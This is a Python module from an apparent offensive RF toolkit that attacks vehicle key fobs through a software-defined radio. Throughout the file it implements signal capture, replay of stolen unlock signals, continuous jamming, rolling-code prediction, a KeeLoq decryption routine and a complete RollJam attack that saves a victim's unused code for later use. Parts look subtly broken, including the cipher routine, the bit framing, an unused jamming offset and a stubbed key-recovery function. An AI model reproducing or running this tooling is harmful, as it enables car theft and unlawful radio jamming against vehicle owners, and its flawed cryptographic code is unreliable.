#!/usr/bin/env python3
"""
RF Arsenal OS - Key Fob Attack Module

Vehicle key fob security testing including:
- Signal capture and analysis
- Rolling code reverse engineering
- Replay attacks
- RollJam attacks
- Signal jamming

Supported frequencies: 315 MHz, 433.92 MHz, 868 MHz, 915 MHz
Supported protocols: Fixed code, rolling code (KeeLoq, HiTag2, etc.)

Hardware Required: BladeRF 2.0 micro xA9 or compatible SDR

Author: RF Arsenal Team
License: For authorized security testing only
"""

import struct
import time
import threading
import logging
import numpy as np
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple
from datetime import datetime
from collections import deque

logger = logging.getLogger(__name__)


class KeyFobFrequency(Enum):
    """Common key fob frequencies"""
    FREQ_315MHZ = 315_000_000
    FREQ_433MHZ = 433_920_000
    FREQ_868MHZ = 868_000_000
    FREQ_915MHZ = 915_000_000


class KeyFobProtocol(Enum):
    """Key fob protocols"""
    FIXED_CODE = "fixed_code"
    KEELOQ = "keeloq"
    HITAG2 = "hitag2"
    AUT64 = "aut64"
    DST40 = "dst40"
    DST80 = "dst80"
    MEGAMOS = "megamos"
    HITAG_AES = "hitag_aes"
    UNKNOWN = "unknown"


class ModulationType(Enum):
    """RF modulation types"""
    ASK_OOK = "ask_ook"
    FSK = "fsk"
    PSK = "psk"
    GFSK = "gfsk"


@dataclass
class KeyFobCapture:
    """Captured key fob signal"""
    timestamp: float
    frequency: float
    raw_iq: np.ndarray
    demodulated: Optional[bytes] = None
    protocol: KeyFobProtocol = KeyFobProtocol.UNKNOWN
    rolling_code: Optional[int] = None
    serial_number: Optional[int] = None
    button_code: Optional[int] = None
    signal_strength: float = 0.0
    
    def __str__(self) -> str:
        proto = self.protocol.value
        if self.rolling_code:
            return f"[{proto}] SN:{self.serial_number:08X} Code:{self.rolling_code:08X}"
        return f"[{proto}] Raw: {len(self.raw_iq)} samples"


@dataclass
class RollingCodeState:
    """Rolling code tracking state"""
    serial_number: int
    last_code: int
    code_history: List[int] = field(default_factory=list)
    predicted_next: Optional[int] = None
    key_guess: Optional[bytes] = None


class RollingCodeAnalyzer:
    """
    Rolling Code Analyzer
    
    Analyzes captured rolling codes to:
    - Track code sequences
    - Predict next codes
    - Attempt key recovery
    """
    
    def __init__(self):
        self._states: Dict[int, RollingCodeState] = {}
        self._captures: List[KeyFobCapture] = []
    
    def add_capture(self, capture: KeyFobCapture):
        """Add captured signal for analysis"""
        self._captures.append(capture)
        
        if capture.serial_number and capture.rolling_code:
            sn = capture.serial_number
            
            if sn not in self._states:
                self._states[sn] = RollingCodeState(
                    serial_number=sn,
                    last_code=capture.rolling_code
                )
            
            state = self._states[sn]
            state.code_history.append(capture.rolling_code)
            state.last_code = capture.rolling_code
            
            # Attempt prediction
            if len(state.code_history) >= 3:
                state.predicted_next = self._predict_next_code(state)
    
    def _predict_next_code(self, state: RollingCodeState) -> Optional[int]:
        """Attempt to predict next rolling code"""
        if len(state.code_history) < 2:
            return None
        
        # Simple delta analysis (works for weak implementations)
        deltas = []
        for i in range(1, len(state.code_history)):
            delta = (state.code_history[i] - state.code_history[i-1]) & 0xFFFFFFFF
            deltas.append(delta)
        
        if len(set(deltas)) == 1:
            # Constant delta found (weak implementation!)
            logger.warning("Constant delta detected - weak rolling code!")
            return (state.last_code + deltas[0]) & 0xFFFFFFFF
        
        return None
    
    def get_state(self, serial_number: int) -> Optional[RollingCodeState]:
        """Get tracking state for serial number"""
        return self._states.get(serial_number)
    
    def keeloq_decrypt(
        self,
        encrypted: int,
        key: int
    ) -> int:
        """
        KeeLoq decryption
        
        Args:
            encrypted: 32-bit encrypted code
            key: 64-bit manufacturer key
            
        Returns:
            Decrypted 32-bit value
        """
        # KeeLoq NLF (Non-Linear Function)
        nlf = 0x3A5C742E
        
        x = encrypted
        
        for i in range(528):
            # Extract key bit
            key_bit = (key >> (15 - (i % 64))) & 1
            
            # Extract feedback bits
            b0 = (x >> 0) & 1
            b1 = (x >> 8) & 1
            b2 = (x >> 19) & 1
            b3 = (x >> 25) & 1
            b4 = (x >> 30) & 1
            
            # NLF lookup
            nlf_in = (b4 << 4) | (b3 << 3) | (b2 << 2) | (b1 << 1) | b0
            nlf_out = (nlf >> nlf_in) & 1
            
            # Feedback
            fb = nlf_out ^ b0 ^ ((x >> 16) & 1) ^ key_bit
            
            # Shift
            x = ((x >> 1) | (fb << 31)) & 0xFFFFFFFF
        
        return x
    
    def attempt_key_recovery(
        self,
        serial_number: int,
        known_plaintexts: List[Tuple[int, int]] = None
    ) -> Optional[bytes]:
        """
        Attempt to recover encryption key
        
        Args:
            serial_number: Target serial number
            known_plaintexts: List of (plaintext, ciphertext) pairs
            
        Returns:
            Recovered key bytes or None
        """
        state = self._states.get(serial_number)
        if not state:
            return None
        
        # This would implement actual key recovery attacks
        # For now, just a placeholder
        logger.warning("Key recovery not fully implemented")
        return None


class KeyFobAttack:
    """
    Key Fob Attack Controller
    
    Comprehensive key fob security testing:
    - Signal capture and analysis
    - Protocol identification
    - Rolling code tracking
    - Replay attacks
    - RollJam attacks
    """
    
    def __init__(
        self,
        sdr_controller=None,
        frequency: float = 433.92e6,
        sample_rate: float = 2e6
    ):
        self.sdr = sdr_controller
        self.frequency = frequency
        self.sample_rate = sample_rate
        
        self._captures: List[KeyFobCapture] = []
        self._analyzer = RollingCodeAnalyzer()
        
        self._capturing = False
        self._capture_thread: Optional[threading.Thread] = None
        
        self._jamming = False
        self._jam_thread: Optional[threading.Thread] = None
        
        # Signal detection parameters
        self._threshold = 0.1
        self._min_signal_length = 1000  # samples
        
        logger.info(f"Key Fob Attack initialized: {frequency/1e6:.3f} MHz")
    
    def start_capture(
        self,
        duration: float = None,
        callback: Callable[[KeyFobCapture], None] = None
    ):
        """
        Start capturing key fob signals
        
        Args:
            duration: Capture duration (None = indefinite)
            callback: Called for each capture
        """
        self._capturing = True
        
        def _capture_loop():
            start_time = time.time()
            
            while self._capturing:
                if duration and (time.time() - start_time) > duration:
                    break
                
                # Capture samples
                samples = self._receive_samples(int(self.sample_rate * 0.1))
                
                if samples is not None:
                    # Detect signals
                    signals = self._detect_signals(samples)
                    
                    for signal in signals:
                        capture = self._process_signal(signal)
                        if capture:
                            self._captures.append(capture)
                            self._analyzer.add_capture(capture)
                            
                            if callback:
                                callback(capture)
                
                time.sleep(0.01)
            
            self._capturing = False
        
        self._capture_thread = threading.Thread(target=_capture_loop, daemon=True)
        self._capture_thread.start()
        logger.info("Capture started")
    
    def stop_capture(self):
        """Stop capturing"""
        self._capturing = False
        if self._capture_thread:
            self._capture_thread.join(timeout=2.0)
        logger.info(f"Capture stopped. {len(self._captures)} signals captured")
    
    def _receive_samples(self, count: int) -> Optional[np.ndarray]:
        """Receive IQ samples from SDR"""
        if self.sdr:
            try:
                return self.sdr.receive(count)
            except Exception as e:
                logger.error(f"Receive error: {e}")
        
        # Simulated samples for testing
        return np.random.randn(count) + 1j * np.random.randn(count)
    
    def _detect_signals(self, samples: np.ndarray) -> List[np.ndarray]:
        """Detect key fob signals in samples"""
        signals = []
        
        # Compute envelope
        envelope = np.abs(samples)
        
        # Find signal regions above threshold
        above_threshold = envelope > (np.mean(envelope) + self._threshold * np.std(envelope))
        
        # Find contiguous regions
        signal_start = None
        for i, above in enumerate(above_threshold):
            if above and signal_start is None:
                signal_start = i
            elif not above and signal_start is not None:
                if i - signal_start >= self._min_signal_length:
                    signals.append(samples[signal_start:i])
                signal_start = None
        
        return signals
    
    def _process_signal(self, signal: np.ndarray) -> Optional[KeyFobCapture]:
        """Process detected signal"""
        try:
            # Demodulate (ASK/OOK)
            envelope = np.abs(signal)
            threshold = (np.max(envelope) + np.min(envelope)) / 2
            bits = (envelope > threshold).astype(int)
            
            # Convert to bytes
            demodulated = self._bits_to_bytes(bits)
            
            # Identify protocol
            protocol, parsed = self._identify_protocol(demodulated)
            
            capture = KeyFobCapture(
                timestamp=time.time(),
                frequency=self.frequency,
                raw_iq=signal,
                demodulated=demodulated,
                protocol=protocol,
                signal_strength=np.mean(np.abs(signal))
            )
            
            if parsed:
                capture.serial_number = parsed.get('serial')
                capture.rolling_code = parsed.get('code')
                capture.button_code = parsed.get('button')
            
            return capture
            
        except Exception as e:
            logger.error(f"Signal processing error: {e}")
            return None
    
    def _bits_to_bytes(self, bits: np.ndarray) -> bytes:
        """Convert bit array to bytes"""
        # Simplified - would need proper timing recovery
        result = []
        for i in range(0, len(bits) - 7, 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)
    
    def _identify_protocol(
        self,
        data: bytes
    ) -> Tuple[KeyFobProtocol, Optional[Dict[str, Any]]]:
        """Identify key fob protocol from demodulated data"""
        if len(data) < 4:
            return KeyFobProtocol.UNKNOWN, None
        
        # KeeLoq detection (66-bit packet)
        if len(data) >= 9:
            # Try KeeLoq parsing
            try:
                serial = struct.unpack('<I', data[0:4])[0] & 0x0FFFFFFF
                encrypted = struct.unpack('<I', data[4:8])[0]
                
                return KeyFobProtocol.KEELOQ, {
                    'serial': serial,
                    'code': encrypted,
                    'button': (data[0] >> 4) & 0x0F
                }
            except Exception:
                pass
        
        # Fixed code detection
        if len(data) >= 3:
            return KeyFobProtocol.FIXED_CODE, {
                'code': int.from_bytes(data[:4], 'big') if len(data) >= 4 else int.from_bytes(data, 'big')
            }
        
        return KeyFobProtocol.UNKNOWN, None
    
    def replay(self, capture: KeyFobCapture) -> bool:
        """
        Replay captured signal
        
        Args:
            capture: Signal to replay
            
        Returns:
            True if transmitted successfully
        """
        if capture.protocol == KeyFobProtocol.KEELOQ:
            logger.warning("Replaying rolling code - may not work!")
        
        if self.sdr:
            try:
                self.sdr.set_frequency(capture.frequency)
                self.sdr.transmit(capture.raw_iq)
                logger.info("Signal replayed")
                return True
            except Exception as e:
                logger.error(f"Replay failed: {e}")
                return False
        
        logger.info("Simulated replay (no SDR)")
        return True
    
    def get_captures(self) -> List[KeyFobCapture]:
        """Get all captures"""
        return list(self._captures)
    
    def get_analyzer(self) -> RollingCodeAnalyzer:
        """Get rolling code analyzer"""
        return self._analyzer
    
    def clear_captures(self):
        """Clear captured signals"""
        self._captures.clear()


class RollJamAttack:
    """
    RollJam Attack Implementation
    
    Simultaneously:
    1. Jam the legitimate signal
    2. Capture the rolling code
    3. When user presses again, capture second code
    4. Replay first code (user thinks it worked)
    5. Save second code for later use
    
    Requires: Two SDRs or full-duplex SDR
    """
    
    def __init__(
        self,
        capture_sdr=None,
        jam_sdr=None,
        frequency: float = 433.92e6
    ):
        self.capture_sdr = capture_sdr
        self.jam_sdr = jam_sdr
        self.frequency = frequency
        
        self._captured_codes: deque = deque(maxlen=10)
        self._running = False
        self._jam_offset = 1e6  # Jam 1 MHz away from center
        
        self._key_fob_attack = KeyFobAttack(
            sdr_controller=capture_sdr,
            frequency=frequency
        )
        
        logger.info("RollJam Attack initialized")
    
    def start(self, callback: Callable[[KeyFobCapture, str], None] = None):
        """
        Start RollJam attack
        
        Args:
            callback: Called with (capture, event_type)
                     event_type: 'captured', 'jammed', 'replayed'
        """
        self._running = True
        
        # Start jamming
        self._start_jamming()
        
        # Start capture with callback
        def _on_capture(capture: KeyFobCapture):
            self._captured_codes.append(capture)
            
            if callback:
                callback(capture, 'captured')
            
            # If we have 2 codes, replay first one
            if len(self._captured_codes) >= 2:
                first_code = self._captured_codes[0]
                
                # Brief pause in jamming to transmit
                self._stop_jamming()
                time.sleep(0.01)
                
                self._key_fob_attack.replay(first_code)
                
                if callback:
                    callback(first_code, 'replayed')
                
                # Remove used code
                self._captured_codes.popleft()
                
                # Resume jamming
                self._start_jamming()
        
        self._key_fob_attack.start_capture(callback=_on_capture)
        logger.info("RollJam attack started")
    
    def stop(self):
        """Stop RollJam attack"""
        self._running = False
        self._stop_jamming()
        self._key_fob_attack.stop_capture()
        logger.info("RollJam attack stopped")
    
    def _start_jamming(self):
        """Start jamming transmission"""
        if self.jam_sdr:
            try:
                self.jam_sdr.set_frequency(self.frequency)
                # Transmit noise
                noise = np.random.randn(10000) + 1j * np.random.randn(10000)
                self.jam_sdr.transmit(noise, continuous=True)
                logger.debug("Jamming started")
            except Exception as e:
                logger.error(f"Jam start failed: {e}")
    
    def _stop_jamming(self):
        """Stop jamming transmission"""
        if self.jam_sdr:
            try:
                self.jam_sdr.stop_transmit()
                logger.debug("Jamming stopped")
            except Exception:
                pass
    
    def get_saved_code(self) -> Optional[KeyFobCapture]:
        """
        Get saved rolling code for later use
        
        Returns:
            Most recent unused captured code
        """
        if self._captured_codes:
            return self._captured_codes[-1]
        return None
    
    def use_saved_code(self) -> bool:
        """
        Use (replay) saved code
        
        Returns:
            True if code was available and replayed
        """
        code = self.get_saved_code()
        if code:
            success = self._key_fob_attack.replay(code)
            if success:
                self._captured_codes.pop()
            return success
        return False


class KeyFobReplay:
    """Simple key fob signal replay"""
    
    def __init__(self, sdr_controller=None):
        self.sdr = sdr_controller
        self._library: Dict[str, KeyFobCapture] = {}
    
    def save_capture(self, name: str, capture: KeyFobCapture):
        """Save capture to library"""
        self._library[name] = capture
        logger.info(f"Saved capture '{name}'")
    
    def load_capture(self, name: str) -> Optional[KeyFobCapture]:
        """Load capture from library"""
        return self._library.get(name)
    
    def replay(self, name: str) -> bool:
        """Replay saved capture by name"""
        capture = self.load_capture(name)
        if not capture:
            logger.error(f"Capture '{name}' not found")
            return False
        
        if self.sdr:
            try:
                self.sdr.set_frequency(capture.frequency)
                self.sdr.transmit(capture.raw_iq)
                logger.info(f"Replayed '{name}'")
                return True
            except Exception as e:
                logger.error(f"Replay failed: {e}")
                return False
        
        logger.info(f"Simulated replay '{name}'")
        return True
    
    def list_captures(self) -> List[str]:
        """List saved captures"""
        return list(self._library.keys())
    
    def export_capture(self, name: str, filepath: str) -> bool:
        """Export capture to file"""
        capture = self.load_capture(name)
        if not capture:
            return False
        
        try:
            np.savez(
                filepath,
                iq=capture.raw_iq,
                frequency=capture.frequency,
                protocol=capture.protocol.value,
                timestamp=capture.timestamp
            )
            return True
        except Exception as e:
            logger.error(f"Export failed: {e}")
            return False
    
    def import_capture(self, name: str, filepath: str) -> bool:
        """Import capture from file"""
        try:
            data = np.load(filepath)
            capture = KeyFobCapture(
                timestamp=float(data['timestamp']),
                frequency=float(data['frequency']),
                raw_iq=data['iq'],
                protocol=KeyFobProtocol(str(data['protocol']))
            )
            self.save_capture(name, capture)
            return True
        except Exception as e:
            logger.error(f"Import failed: {e}")
            return False
